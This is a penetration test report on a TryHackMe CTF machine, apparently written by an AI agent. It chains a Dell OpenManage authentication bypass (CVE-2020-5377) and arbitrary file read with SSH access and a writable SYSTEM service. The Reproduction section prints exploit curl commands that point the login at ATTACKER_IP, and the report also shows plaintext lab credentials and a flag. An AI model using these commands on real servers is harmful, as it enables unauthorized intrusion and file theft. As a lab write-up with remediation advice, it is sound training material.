#import "report.typ": *

#show: pk-report.with(
  title: "Penetration Test Report",
  subtitle: "THM: Hack Smarter Security",
  target: "10.114.182.240",
  engagement-type: "CTF",
  client: "TryHackMe",
  assessor: "PromptKiddie Agent",
  date: "2026-06-25",
  classification: "CONFIDENTIAL",
)

= Executive Summary

Penetration test of the Hack Smarter Security server, a Windows Server 2019 machine running IIS, SSH, Dell OpenManage Server Administrator, and RDP. The assessment identified four confirmed vulnerabilities, including a critical authentication bypass in Dell OpenManage that enabled arbitrary file read as SYSTEM, leading to full compromise.

#severity-table(critical: 1, high: 2, medium: 1)

== Attack Chain

#attack-chain((
  "Identified Dell OpenManage Server Administrator 9.4.0.2 on port 1311",
  "Exploited CVE-2020-5377: authentication bypass via spoofed SOAP callback",
  "Arbitrary file read as SYSTEM; retrieved IIS web.config with SSH credentials",
  "SSH login as tyler using discovered credentials",
  "Privilege escalation via writable SYSTEM service binary (spoofer-scheduler.exe)",
  "Exfiltrated target list from Administrator desktop",
))

= Findings

== CVE-2020-5377: Dell OpenManage Authentication Bypass

#finding-card(
  title: "Dell OpenManage Server Administrator 9.4.0.2 - Authentication Bypass + Arbitrary File Read",
  severity: "critical",
  cvss: "9.8",
  vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  owasp: "A07:2021",
  attack: "T1190, T1005",
  cve: "CVE-2020-5377",
  status: "confirmed",
)

=== Description

Dell EMC OpenManage Server Administrator version 9.4.0.2 is vulnerable to an authentication bypass. The exploit sends a login request with a `targetmachine` parameter pointing to an attacker-controlled SOAP server. The target's OMSA authenticates against the fake server, which responds with admin-level access, yielding a valid `JSESSIONID`.

The resulting session can read arbitrary files via `DownloadServle%74` (URL encoding bypass), executing as SYSTEM.

=== Reproduction

```bash
# 1. Start fake OMSA callback server on attacker (port 443)
python3 exploit.py callback 443

# 2. Send login with targetmachine pointing to attacker
curl -k -X POST https://TARGET:1311/LoginServlet \
  -d "manession=fakeoid&targetmachine=ATTACKER_IP&..."

# 3. Use resulting JSESSIONID to read files
curl -k "https://TARGET:1311/DownloadServle%74?Path=C:\inetpub\wwwroot\hacksmartersec\web.config" \
  -H "Cookie: JSESSIONID=<session>"
```

=== Evidence

#evidence-block(caption: "web.config containing SSH credentials")[
```xml
<appSettings>
  <add key="sshUsername" value="tyler" />
  <add key="sshPassword" value="IAmA1337h4x0randIkn0wit!" />
</appSettings>
```
]

=== Impact

Complete compromise of the server. The file read operates as SYSTEM, enabling access to any file including SAM database, registry hives, and application credentials.

=== Remediation

Update Dell OpenManage Server Administrator to a patched version. Restrict network access to port 1311 to management networks only.

== Credentials in IIS web.config

#finding-card(
  title: "SSH Credentials Stored in Plaintext in web.config",
  severity: "high",
  cvss: "7.5",
  owasp: "A02:2021",
  attack: "T1552.001",
  status: "confirmed",
)

=== Description

The IIS application `hacksmartersec` stores SSH credentials in plaintext in `web.config`. Combined with the file read vulnerability, this provides direct SSH access as user `tyler`.

=== Remediation

Never store credentials in plaintext configuration files. Use a secrets manager or encrypted credential store.

== Writable SYSTEM Service Binary

#finding-card(
  title: "spoofer-scheduler.exe: SYSTEM Service with User-Writable Path",
  severity: "high",
  cvss: "7.8",
  owasp: "A04:2021",
  attack: "T1574.010",
  status: "confirmed",
)

=== Description

The service `spoofer-scheduler` at `C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe` runs as LocalSystem. The directory has `BUILTIN\Users:(F)` (Full Control), allowing any local user to replace the binary and achieve SYSTEM execution on service restart.

=== Remediation

Remove full control permissions for BUILTIN\Users on service binary directories. Only SYSTEM and Administrators should have write access.

== FTP Anonymous Access with Sensitive Data

#finding-card(
  title: "FTP Anonymous Login Exposing Stolen Data",
  severity: "medium",
  cvss: "5.3",
  attack: "T1078",
  status: "confirmed",
)

=== Description

The FTP server on port 21 allows anonymous login. The server contains files including `Credit-Cards-We-Pwned.txt` and `stolen-passport.png`.

=== Remediation

Disable anonymous FTP access. Require authentication for all FTP connections.

= Objectives

== User Flag

#flag-captured("THM{4ll15n0tw3llw1thd3ll}")

Found at `C:\Users\tyler\Desktop\user.txt` after SSH login with credentials from web.config.

== Target List

The Hack Smarter group is targeting: *CyberLens, WorkSmarter, SteelMountain*

Found at `C:\Users\Administrator\Desktop\Hacking-Targets\hacking-targets.txt`.

= Timeline

#table(
  columns: (auto, auto, 1fr),
  [*Time*], [*Phase*], [*Action*],
  [08:20], [Recon], [Port scan: identified FTP, SSH, HTTP, OMSA, RDP],
  [08:22], [Enum], [FTP anonymous access confirmed; downloaded loot files],
  [08:25], [Enum], [Dell OpenManage 9.4.0.2 identified on port 1311],
  [08:30], [Exploit], [CVE-2020-5377 auth bypass confirmed],
  [08:32], [Exploit], [web.config read via arbitrary file read],
  [08:33], [Exploit], [SSH as tyler; user flag captured],
  [08:35], [Post-exploit], [spoofer-scheduler.exe SYSTEM privesc path identified],
  [08:36], [Post-exploit], [Target list exfiltrated from Administrator desktop],
)

= Recommendations

+ *Patch Dell OpenManage* to the latest version to address CVE-2020-5377
+ *Remove plaintext credentials* from web.config; use Windows Credential Manager
+ *Fix service permissions* on spoofer-scheduler.exe directory
+ *Disable anonymous FTP* or restrict to non-sensitive directories
+ *Network segmentation* - restrict management ports (1311, 3389) to admin networks
